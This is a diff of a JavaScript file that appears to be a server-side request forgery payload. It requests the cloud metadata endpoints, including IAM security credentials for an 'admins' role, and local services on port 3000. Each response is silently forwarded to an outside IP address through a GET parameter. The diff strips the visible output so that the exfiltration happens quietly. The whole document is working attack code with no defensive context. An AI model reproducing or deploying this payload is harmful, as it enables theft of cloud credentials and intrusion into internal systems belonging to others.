@@ -2,24 +2,21 @@ var url0 = "http://169.254.169.254/latest/dynamic/instance-identity/document";
 var url1 = "http://169.254.169.254/latest/meta-data/iam/security-credentials/admins";
 var url2 = "http://localhost:3000";
 var url3 = "http://localhost:3000/1/catalogs";
-var url4 = "https://ifconfig.pro";
+var url4 = "http://ifconfig.pro";
+var url5 = "https://192.241.169.35:7777/url5";
 
-var out = document.getElementById("output");
-out.innerHTML = "init";
-console.log("init");
+
 function handler() {
   console.log(1);
   if(this.status == 200 && this.responseText != null) {
     // success!
-    if (this.responseText.search("Not Found")){
       //do whatever you want
       var xhr2 = new XMLHttpRequest();
-      xhr2.onreadystatechange = none; 
+      //xhr2.onreadystatechange = none; 
       xhr2.open("GET", 'https://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
-      
-      out.innerHTML += this.responseText;
-}
+    
+
   } else {
     // something went wrong
     //console.log("hmmm...")
@@ -50,5 +47,10 @@ xhr.send();
  
 try{
 xhr.open("GET", url4, true);
+xhr.send();
+ } catch(err) {}
+ 
+ try{
+xhr.open("GET", url5, true);
 xhr.send();
  } catch(err) {}
